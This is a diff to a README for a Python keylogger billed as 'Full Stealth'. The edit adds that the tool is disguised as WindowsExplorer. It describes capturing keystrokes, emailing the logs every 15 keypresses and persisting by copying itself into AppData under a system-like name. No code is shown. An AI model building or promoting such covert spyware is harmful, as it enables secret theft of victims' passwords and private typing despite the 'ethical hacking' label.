@@ -1,7 +1,7 @@
 # **Full Stealth Keylogger v1**  
 
 **Project Overview**  
-WindowsExplorer is a **Python-based keylogger** designed for **ethical hacking, cybersecurity research, and educational purposes**. This keylogger captures keystrokes and **sends logs via email after every 15 keypresses (customizable)** instead of relying on a time-based interval.  
+Full Stealth keylogger (disguised as WindowsExplorer) is a **Python-based keylogger** designed for **ethical hacking, cybersecurity research, and educational purposes**. This keylogger captures keystrokes and **sends logs via email after every 15 keypresses (customizable)** instead of relying on a time-based interval.  
 
 Additionally, the script ensures persistence by:  
 - **Moving itself** to `C:\Users\<user>\AppData\Roaming\WindowsExplorer.exe`  
